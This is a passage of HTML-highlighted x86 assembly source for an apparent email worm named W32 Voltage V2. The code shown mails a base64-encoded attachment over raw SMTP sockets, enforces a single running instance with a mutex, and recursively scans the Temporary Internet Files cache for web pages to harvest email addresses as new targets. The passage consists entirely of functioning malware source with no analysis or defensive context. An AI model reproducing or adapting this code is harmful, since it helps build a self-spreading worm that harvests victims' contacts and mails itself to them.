    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageAndFileName1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sattch</span><span class="sc0">  
</span><span class="sc5">_ma</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ma2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMessageAndFileName2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageAndFileName2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sattch</span><span class="sc0">
</span><span class="sc5">_ma2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ma3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMessageAndFileName3</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageAndFileName3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sattch</span><span class="sc0">
</span><span class="sc5">_ma3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ma4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMessageAndFileName4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageAndFileName4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sattch</span><span class="sc0">
</span><span class="sc5">_ma4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMessageAndFileName5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageAndFileName5</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">sattch</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;send the attachment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sizeofbase64out</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">base64outputmem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;send end of mail</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfEndOfMail</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EndOfMail</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;get server message</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">
    </span><span class="sc1">;send quit command</span><span class="sc0">
</span><span class="sc5">QuitM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfQuit</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">QUIT</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Disconnect</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FreeBase64Mem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">base64outputmem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FreeWSLibraryAndExit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWinsock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FreeWabMemAndExit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMailAddresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MailsMemory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitMM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MM_SEH_Handler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


    </span><span class="sc5">MessageNumber</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">AllowOnlyOneRun</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;use mutex to check if we already running</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CopyRight</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MUTEX_ALL_ACCESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OpenMutex</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AlreadyRun</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CopyRight</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateMutex</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AlreadyRun</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">MUTEX_ALL_ACCESS</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001F0001h</span><span class="sc0">
    

</span><span class="sc5">__recv</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;scan all .htm,asp,xml temporary files for email addresses</span><span class="sc0">
</span><span class="sc5">SearchEmailsInHTMFiles</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetDebugDir</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"C:\w32_Voltage_V2\TempInetFiles"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetDebugDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">____1_</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">shell_dll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitTMS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">shell_h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_SHGetSpecialFolderPath</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">UnloadSh</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CSIDL_INTERNET_CACHE</span><span class="sc0">        </span><span class="sc1">;get temporary internet files directory</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TempDir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">              </span><span class="sc1">;success ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnloadSh</span><span class="sc0">            
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TempDir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">____1_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c800h</span><span class="sc0">              </span><span class="sc1">;50k</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GPTR</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;allocate 50k of memory which used to store mails</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">UnloadSh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MailsMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastMailPointer</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfEmails</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NewMail</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFiles</span><span class="sc0">
</span><span class="sc5">UnloadSh</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;unload shell library</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">shell_h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitTMS</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;exit temp mails search</span><span class="sc0">
    

    </span><span class="sc5">shell_dll</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Shell32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">shell_h</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SHGetSpecialFolderPath</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SHGetSpecialFolderPathA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    
    </span><span class="sc5">CSIDL_INTERNET_CACHE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">

    </span><span class="sc5">MailsMemory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">NumberOfEmails</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">TempDir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    
</span><span class="sc5">FindFiles</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;recursive scan directorys for files</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">search_mask</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitFind</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save search handle</span><span class="sc0">
</span><span class="sc5">@find</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">        </span><span class="sc1">;is directory ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Is_File</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">      </span><span class="sc1">;most be not .. or .</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FindNext</span><span class="sc0">
